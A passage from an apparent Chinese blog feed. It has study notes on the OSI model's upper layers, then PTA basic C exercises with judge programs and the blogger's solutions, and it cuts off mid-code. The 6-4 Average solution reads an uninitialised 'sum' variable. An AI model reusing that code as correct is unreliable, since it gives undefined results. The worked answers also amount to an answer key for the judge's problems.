<p>　　两个人对话，我和你说话，你耳朵听到了也能理解，但如果对方是外国人，他听到了我的声音，他理解了吗？他不能理解。那对于计算机网络来言，客户机发了一个请求给服务器，服务器应该能理解这个请求到底是什么，所以接下去的问题是你怎么样理解？这个理解有两个层次，我讲中国话，他只能懂英文，那么这当中应该有一个翻译。把汉语翻译成英语，这样的工作就交给下一层表示层来做了。</p>
<hr>
<h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a><strong>表示层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表示层（Presentation Layer）是OSI参考模型中的第六层。（API）</span><br></pre></td></tr></table></figure></div>

<p>　　是应用程序和网络之间的翻译官，在表示层，数据将按照网络能理解的方案进行格式化；这种格式化也因所使用网络的类型不同而不同。表示层管理数据的解密与加密。</p>
<p>　　如系统口令的处理。例如：在Internet上查询你银行账户，使用的即是一种安全连接。你的账户数据在发送前被加密，在网络的另一端，表示将对接收到的数据解密。除此之外，表示层协议还对图片和文件格式信息进行解码和编码。</p>
<h2 id="它为应用程序提供接口。API负责SPI与应用程序之间的通信；定义不同体系间不同数据格式；具体说明独立结构的数据传输格式；编码和解码数据；加密和解密数据；压缩和解压缩数据。"><a href="#它为应用程序提供接口。API负责SPI与应用程序之间的通信；定义不同体系间不同数据格式；具体说明独立结构的数据传输格式；编码和解码数据；加密和解密数据；压缩和解压缩数据。" class="headerlink" title="　　它为应用程序提供接口。API负责SPI与应用程序之间的通信；定义不同体系间不同数据格式；具体说明独立结构的数据传输格式；编码和解码数据；加密和解密数据；压缩和解压缩数据。 
　　"></a>　　它为应用程序提供接口。API负责SPI与应用程序之间的通信；定义不同体系间不同数据格式；具体说明独立结构的数据传输格式；编码和解码数据；加密和解密数据；压缩和解压缩数据。 
　　</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">应用层（Application Layer）是OSI参考模型中的最高层，即第七层。</span><br></pre></td></tr></table></figure></div>
<p>　　它为应用程序提供服务以保证通信，但不是进行通信的应用程序本身。应用层直接和应用程序接口并提供常见的网络应用服务。应用层也向表示层发出请求。是开放系统的最高层,是直接为应用进程提供服务的。其作用是在实现多个系统应用进程相互通信的同时，完成一系列业务处理所需的服务。其服务元素分为两类：公共应用服务元素CASE和特定应用服务元素SASE。CASE提供最基本的服务，它成为应用层中任何用户和任何服务元素的用户，主要为应用进程通信，分布系统实现提供基本的控制机制；特定服务SASE则要满足一些特定服务，如文卷传送,访问管理，作业传送,银行事务,订单输入等。这些将涉及到虚拟终端，作业传送与操作，文卷传送及访问管理,远程数据库访问，图形核心系统，开放系统互连管理等等。</p>
<p>小结：</p>
<ul>
<li><p><strong>物理层</strong>：主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输,到达目的地后在转化为1、0，也就是我们常说的模数转换与数模转换）。这一层的数据叫做比特。 　　</p>
</li>
<li><p><strong>数据链路层</strong>：主要将从物理层接收的数据进行MAC地址（网卡的地址）的封装与解封装。常把这一层的数据叫做帧。在这一层工作的设备是交换机，数据通过交换机来传输。 </p>
</li>
<li><p><strong>网络层</strong>：主要将从下层接收到的数据进行IP地址（例192.168.0.1)的封装与解封装。在这一层工作的设备是路由器，常把这一层的数据叫做数据包。 </p>
</li>
<li><p><strong>传输层</strong>：定义了一些传输数据的协议和端口号（WWW端口80等），如：TCP（传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据），UDP（用户数据报协议，与TCP特性恰恰相反，用于传输可靠性要求不高，数据量小的数据，如QQ聊天数据就是通过这种方式传输的）。 主要是将从下层接收的数据进行分段进行传输，到达目的地址后在进行重组。常常把这一层数据叫做段。 　　</p>
</li>
<li><p><strong>会话层</strong>：通过传输层（端口号：传输端口与接收端口）建立数据传输的通路。主要在你的系统之间发起会话或或者接受会话请求（设备之间需要互相认识可以是IP也可以是MAC或者是主机名） </p>
</li>
<li><p><strong>表示层</strong>：主要是进行对接收的数据进行解释、加密与解密、压缩与解压缩等（也就是把计算机能够识别的东西转换成人能够能识别的东西（如图片、声音等）） 　　</p>
</li>
<li><p><strong>应用层</strong>：主要是一些终端的应用，比如说FTP（各种文件下载），WEB（IE浏览），QQ之类的（你就把它理解成我们在电脑屏幕上可以看到的东西．就 是终端应用）。</p>
</li>
</ul>
<hr>
<h2 id="举个发邮件例子"><a href="#举个发邮件例子" class="headerlink" title="举个发邮件例子"></a>举个发邮件例子</h2><p>　机A向主机B发送数据，该数据的产生肯定是一个应用层的程序产生的，如IE浏览器或者Email的客户端等等。这些程序在应用层需要有不同的接口，IE是浏览网页的使用HTTP协议，那么HTTP应用层为浏览网页的软件留下的网络接口。Email客户端使用smtp和pop3 协议来收发电子邮件，所以smtp和pop3就是应用层为电子邮件的软件留下的接口。</p>
<hr>
<p>　　实例：</p>
<h3 id="1、应用层"><a href="#1、应用层" class="headerlink" title="1、应用层"></a>1、应用层</h3><p>　　我们假设A向B发送了一封电子邮件，因此主机A会使用smtp协议来处理该数据，即在数据前加上SMTP的标记，以便使对端在收到后知道使用什么软件来处理该数据。</p>
<h3 id="2、表示层"><a href="#2、表示层" class="headerlink" title="2、表示层"></a>2、表示层</h3><p>　　应用层将数据处理完成后会交给表示层，表示层会进行必要的格式转换，使用一种通信双方都能识别的编码来处理该数据。</p>
<p>　　同时将处理数据的方法添加在数据中，以便对端知道怎样处理数据。</p>
<h3 id="3、会话层"><a href="#3、会话层" class="headerlink" title="3、会话层"></a>3、会话层</h3><p>　　表示层处理完成后，将数据交给会话层，会话层会在A主机和B主机之间建立一条只用于传输该数据的会话通道，并监视它的连接状态，直到数据同步完成，断开该会话。</p>
<p>　　注意：A和B之间可以同时有多条会话通道出现，但每一条都和其他的不能混淆。会话层的作用就是有办法来区别不同的会话通道。</p>
<h3 id="4、传输层"><a href="#4、传输层" class="headerlink" title="4、传输层"></a>4、传输层</h3><p>　　会话通道建立后，为了保证数据传输中的可靠性，就需要在数据传输的构成当中对数据进行不要的处理，如分段，编号，差错校验，确认、重传等等。</p>
<p>　　这些方法的实现必须依赖通信双方的控制，传输层的作用就是在通信双方之间利用上面的会话通道传输控制信息，完成数据的可靠传输。</p>
<h3 id="5、网络层"><a href="#5、网络层" class="headerlink" title="5、网络层"></a>5、网络层</h3><p>　　网络层是实际传输数据的层次，在网络层中必须要将传输层中处理完成的数据再次封装，添加上自己的地址信息和对端接受者的地址信息，并且要在网络中找到一条由自己到接收者最好的路径。然后按照最佳路径发送到网络中。</p>
<h3 id="6、数据链路层"><a href="#6、数据链路层" class="headerlink" title="6、数据链路层"></a>6、数据链路层</h3><p>　　数据链路层将网络层的数据再次进行封装，该层会添加能唯一标识每台设备的地址信息（MAC地址），是这个数据在相邻的两个设备之间一段一段的传输。最终到达目的地。</p>
<h3 id="7、物理层"><a href="#7、物理层" class="headerlink" title="7、物理层"></a>7、物理层</h3><p>　　物理层将数据链路层的数据转换成电流传输的物理线路。</p>
<p>　　通过物理线路传递的B主机后，B主机会将电信号转换成数据链路层的数据，数据链路层再去掉本层的硬件地址信息和其他的对端添加的内容上交给网络层，网络层同样去掉对端网络层添加的内容后上交给自己的上层。最终数据到达B主机的应用层，应用层看到数据使用smtp协议封装，就知道应用电子邮件的软件来处理。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>PTA a题</title>
    <url>/yakko117/2020/03/02/PTAbasic/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>算法原理要花时间好好摸一下，推荐一个大佬的数据结构算法详解<br><a href="https://github.com/labuladong/fucking-algorithm">手把手撕LeetCode题目，扒各种算法套路的裤子</a></p>
<span id="more"></span>

<h1 id="基础编程题目集"><a href="#基础编程题目集" class="headerlink" title="基础编程题目集"></a>基础编程题目集</h1><h2 id="6-1-简单输出整数-10分"><a href="#6-1-简单输出整数-10分" class="headerlink" title="6-1 简单输出整数 (10分)"></a>6-1 简单输出整数 (10分)</h2><p>本题要求实现一个函数，对给定的正整数 <code>N</code>，打印从1到N的全部正整数。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrintN</span> <span class="params">( <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中N是用户传入的参数。该函数必须将从1到N的全部正整数顺序打印出来，每个数字占1行。</p>
<h3 id="裁判测试程序样例："><a href="#裁判测试程序样例：" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintN</span> <span class="params">( <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    PrintN( N );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入样例：</span><br><span class="line">3</span><br><span class="line">输出样例：</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrintN</span> <span class="params">( <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-2-多项式求值-15分"><a href="#6-2-多项式求值-15分" class="headerlink" title="6-2 多项式求值 (15分)"></a>6-2 多项式求值 (15分)</h2><p>本题要求实现一个函数，计算阶数为 <code>n</code>，系数为<code>a[0]</code> … <code>a[n]</code>的多项式<br>$$f(x)&#x3D;\sum_{i&#x3D;0}^n(a[i]×x^i<br>)$$在x点的值。</p>
<p>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">( <span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>n</code> 是多项式的阶数，<code>a[]</code> 中存储系数，<code>x</code> 是给定点。函数须返回多项式 <code>f(x)</code> 的值。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入样例：</span><br><span class="line">2 1.1</span><br><span class="line">1 2.5 -38.7</span><br><span class="line">输出样例：</span><br><span class="line">-43.1</span><br></pre></td></tr></table></figure></div>

<h3 id="裁判测试程序样例：-1"><a href="#裁判测试程序样例：-1" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10 <span class="comment">// 定义最多10个a项</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">( <span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n, i;</span><br><span class="line">    <span class="type">double</span> a[MAXN], x;</span><br><span class="line">    <span class="comment">// double 就是比 float 精度更高的浮点数表示类型</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %lf&quot;</span>, &amp;n, &amp;x);</span><br><span class="line">    <span class="comment">// %lf 双精度浮点型数据的输入格式控制符</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;=n; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.1f\n&quot;</span>, f(n, a, x));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>

<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">f</span><span class="params">( <span class="type">int</span> n, <span class="type">double</span> a[], <span class="type">double</span> x )</span> &#123;</span><br><span class="line">    <span class="type">double</span> sum = a[<span class="number">0</span>];</span><br><span class="line">    <span class="type">double</span> res = <span class="number">1.0</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i) &#123;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        int i = 3 ;</span></span><br><span class="line"><span class="comment">        a = i++; -&gt; a=3 -&gt; 先让a变成i的值，再让i加1</span></span><br><span class="line"><span class="comment">        b = ++i; -&gt; b=4 -&gt; 先让i加1, 再让b变成i的值</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        res *= x; <span class="comment">// res = x, x^2, x^3...  // res = res*x</span></span><br><span class="line">        sum += a[i] * res; <span class="comment">// sum = sum + a[i]*res</span></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        printf(&quot;i=: %d&quot;, i);</span></span><br><span class="line"><span class="comment">        echo &quot;i=1 / i=2&quot;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-3-简单求和-10分"><a href="#6-3-简单求和-10分" class="headerlink" title="6-3 简单求和 (10分)"></a>6-3 简单求和 (10分)</h2><p>本题要求实现一个函数，求给定的 <code>N</code> 个整数的和。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Sum</span> <span class="params">( <span class="type">int</span> List[], <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中给定整数存放在数组 <code>List[]</code> 中，正整数N是数组元素个数。该函数须返回N个 <code>List[]</code> 元素的和。</p>
<h3 id="裁判测试程序样例：-2"><a href="#裁判测试程序样例：-2" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Sum</span> <span class="params">( <span class="type">int</span> List[], <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> List[MAXN], N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;List[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, Sum(List, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12 34 -5</span><br><span class="line">输出</span><br><span class="line">41</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Sum</span> <span class="params">( <span class="type">int</span> List[], <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        sum += List[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-4-求自定类型元素的平均-10分"><a href="#6-4-求自定类型元素的平均-10分" class="headerlink" title="6-4 求自定类型元素的平均 (10分)"></a>6-4 求自定类型元素的平均 (10分)</h2><p>本题要求实现一个函数，求N个集合元素 <code>S[]</code> 的平均值，其中集合元素的类型为自定义的 <code>ElementType</code>。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Average</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中给定集合元素存放在 <code>数组S[]</code>中，正整数N是数组元素个数。该函数须返回N个 <code>S[]</code>元素的平均值，其值也必须是<code>ElementType类型</code>。</p>
<h3 id="裁判测试程序样例：-3"><a href="#裁判测试程序样例：-3" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> ElementType;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">Average</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="type">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, Average(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">13.77</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Average</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    ElementType sum, average;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        sum += S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    average = sum/N;</span><br><span class="line">    <span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-5-求自定类型元素的最大值-10分"><a href="#6-5-求自定类型元素的最大值-10分" class="headerlink" title="6-5 求自定类型元素的最大值 (10分)"></a>6-5 求自定类型元素的最大值 (10分)</h2><p>本题要求实现一个函数，求N个集合元素 <code>S[]</code> 中的最大值，其中集合元素的类型为自定义的 <code>ElementType</code>。</p>
<p>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Max</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span>;</span><br></pre></td></tr></table></figure></div>
<p>其中给定集合元素存放在 <code>数组S[]</code> 中，正整数N是数组元素个数。该函数须返回N个<code>S[]元素中的最大值</code>，其值也必须是 <code>ElementType类型</code>。</p>
<h3 id="裁判测试程序样例：-4"><a href="#裁判测试程序样例：-4" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> ElementType;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">Max</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="type">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, Max(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div>
<p>然后是输入输出样式：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">34.00</span><br></pre></td></tr></table></figure></div>

<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElementType <span class="title function_">Max</span><span class="params">( ElementType S[], <span class="type">int</span> N )</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    ElementType max = S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (max &lt; S[i]) &#123;</span><br><span class="line">            max = S[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-6-求单链表结点的阶乘和-15分"><a href="#6-6-求单链表结点的阶乘和-15分" class="headerlink" title="6-6 求单链表结点的阶乘和 (15分)"></a>6-6 求单链表结点的阶乘和 (15分)</h2><p>本题要求实现一个函数，求 <code>单链表L</code> 结点的阶乘和。这里默认所有结点的值非负，且题目保证结果在 <code>int</code> 范围内。<br>函数接口定义：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FactorialSum</span><span class="params">( List L )</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="裁判测试程序样例：-5"><a href="#裁判测试程序样例：-5" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> Data; <span class="comment">/* 存储结点数据 */</span></span><br><span class="line">    PtrToNode Next; <span class="comment">/* 指向下一个结点的指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List; <span class="comment">/* 定义单链表类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">FactorialSum</span><span class="params">( List L )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> N, i;</span><br><span class="line">    List L, p;</span><br><span class="line">    <span class="comment">// 定义2个链表</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 赋初值为 Null</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        p = (List)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">        <span class="comment">// 